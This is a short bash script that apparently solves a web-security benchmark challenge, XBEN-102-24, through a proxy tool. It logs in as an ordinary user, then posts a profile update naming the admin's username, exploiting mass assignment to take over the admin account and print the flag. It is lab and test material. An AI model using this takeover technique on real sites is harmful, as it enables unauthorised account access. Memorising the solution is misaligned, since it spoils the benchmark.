#!/usr/bin/env bash
# XBEN-102-24 — mass-assignment account takeover. Proxy-mode twin. Log in as a
# normal user, then POST the profile update with a username field naming the
# admin: the handler updates the account named in the body, not the session, so
# the admin's record is changed and the response discloses the flag.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben102p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/"; BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=POST' --set 'path=/login' \
  --set 'form.username=test' --set 'form.password=test' >/dev/null
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=POST' --set 'path=/profile' \
  --set 'form.email=attacker@example.com' --set 'form.username=admin' >/dev/null
print_flag
